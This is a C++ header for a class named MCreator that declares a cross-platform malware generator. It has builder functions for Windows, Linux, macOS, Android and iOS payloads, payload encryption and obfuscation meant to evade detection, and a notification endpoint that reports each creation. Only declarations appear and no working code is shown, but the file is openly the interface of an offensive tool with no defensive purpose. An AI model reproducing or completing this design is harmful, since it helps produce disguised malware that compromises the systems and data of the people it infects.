#ifndef MCREATOR_H
#define MCREATOR_H

#include <string>

class MCreator {
public:
   
    static std::string createMalware(const std::string &payloadPath, const std::string &extension = ".exe");

    static std::string createWindowsMalware(const std::string &payloadPath);
    static std::string createLinuxMalware(const std::string &payloadPath);
    static std::string createMacOSMalware(const std::string &payloadPath);
    static std::string createAndroidMalware(const std::string &payloadPath);
    static std::string createiOSMalware(const std::string &payloadPath);

    static void setEncryptionKey(const std::string &key);
    static void setObfuscationPattern(const std::string &pattern);

    static void setLogLevel(int level);
    static void setNotificationEndpoint(const std::string &endpoint);

private:

    static std::string generateUniqueFileName(const std::string &extension);

    static std::string readPayloadFromFile(const std::string &filePath);

    static std::string encryptPayload(const std::string &payload);

    static std::string obfuscatePayload(const std::string &payload);

    static void logCreation(const std::string &filePath);

    static void notifyCreation(const std::string &status, const std::string &filePath);

    static std::string encryptionKey;
    static std::string obfuscationPattern;
    static int logLevel;
    static std::string notificationEndpoint;
};

#endif // MCREATOR_H





